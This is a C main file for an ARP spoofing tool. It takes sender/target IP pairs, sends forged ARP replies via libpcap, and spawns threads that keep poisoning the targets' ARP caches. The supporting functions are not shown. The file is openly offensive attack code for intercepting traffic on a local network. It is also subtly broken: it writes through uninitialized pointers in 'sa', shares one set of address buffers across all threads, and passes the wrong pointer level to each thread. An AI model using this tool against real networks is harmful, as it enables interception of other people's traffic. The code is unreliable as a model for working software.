

#include "arpspoof.h"
#include <pthread.h>


void usage(){
    puts("./arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
}


int main(int argc, char* argv[]) {
    if ( argc < 4 ){
        usage();
        return -1;
    }
    char *dev=argv[1];

    int pair = 0;

    pthread_t p_th[THREAD_N];
    struct spoof_arg *sa[100];

    int status;

    uint8_t my_mac[6],src_mac[6],dst_mac[6];
    uint8_t my_ip[4],src_ip[4],dst_ip[4];

    bpf_u_int32 net;
    bpf_u_int32 mask;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    my_info(my_mac,my_ip,dev);

    for(int i=1;i<(argc/2);i++) {
        inet_pton(AF_INET, argv[i*2], src_ip);
        inet_pton(AF_INET, argv[i*2+1], dst_ip);

        send_arp(handle, my_ip, src_ip, dst_ip, my_mac, src_mac, dst_mac);

        sa[i-1]->handle=handle;
        sa[i-1]->dst_ip=dst_ip;
        sa[i-1]->src_ip=src_ip;
        sa[i-1]->dst_mac=dst_mac;
        sa[i-1]->my_mac=my_mac;
        sa[i-1]->src_mac = src_mac;
        pthread_create(&p_th[i-1],NULL,infect,(void *)&sa[i-1]);
        pair++;
    }

    f_arpspoof(handle,sa,pair);
    for(int i=1;i<(argc/2);i++){
        pthread_join(p_th[i-1],(void **)&status);
    }

    return 0;
}